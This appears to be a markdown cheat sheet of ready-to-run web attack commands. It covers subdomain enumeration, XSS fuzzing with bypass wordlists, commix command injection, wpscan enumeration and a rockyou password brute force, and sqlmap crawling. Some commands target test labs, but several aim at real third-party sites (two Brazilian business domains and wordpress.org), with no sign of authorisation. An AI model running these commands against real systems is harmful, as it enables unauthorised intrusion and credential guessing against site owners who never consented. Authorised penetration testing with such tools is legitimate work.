<h1 align="center">Sub Domain Enumeration</h1>

### Sub Domain finding using assetfinder+httpx
    assetfinder -subs-only faculdadeunica.com.br | httpx -random-agent -mc 200,302 -silent -server -tech-detect -status-code | tee path/validsubDomains.txt

<h1 align="center">CMS Detector</h1>

### auto Detecting
    cmseek -u https://wordpress.org --batch | tee 'path/cmsDetector.txt'

<h1 align="center">Gospider</h1>

### Paramiter finding
    gospider -s "https://www.farmasilva.com.br" --no-redirect -o gospider.txt

<h1 align="center">XSStrike, xss finder</h1>

### xss finding
    xsstrike -u "https://www.farmasilva.com.br/search?search_query=query" -f /usr/share/wordlists/SecLists/Fuzzing/XSS/XSS-Bypass-Strings-BruteLogic.txt

<h1 align="center">XSpear, xss finder</h1>

### xss finding
    XSpear -u 'http://testphp.vulnweb.com/listproducts.php?cat=123' -v 2 -o XSpear.txt

<h1 align="center">XSpear, xss finder</h1>

### os command injection finding
    commix -u 'http://192.168.31.177/vulnerabilities/exec/#' --cookie="security=low; PHPSESSID=hcjrgadiie5f40vup73ehe0fu7; security=low" --data="ip=INJECT_HERE&Submit=Submit"

<h1 align="center">wpscan</h1>

### Vulnerable plugin, themes, users
    wpscan --url https://wordpress.org -e vp,vt,u -o scanned.txt

### Vulnerable plugins, All plugins, Vulnerable themes, All themes, Timthumbs, Config backups, Db exports, User, Media, Bypassing Simple WAFs
    wpscan --url https://wordpress.org -e vp,vt,tt,cb,dbe,u,m --random-user-agent -v -o scanned.txt

### Password brute force attack
    wpscan --url https://wordpress.org -e u --passwords /usr/share/wordlists/rockyou.txt -o scanned.txt

<h1 align="center">sqlmap</h1>

### auto crawling
    sqlmap -u https://wordpress.org -crawl=3 --batch -o sqlmap.txt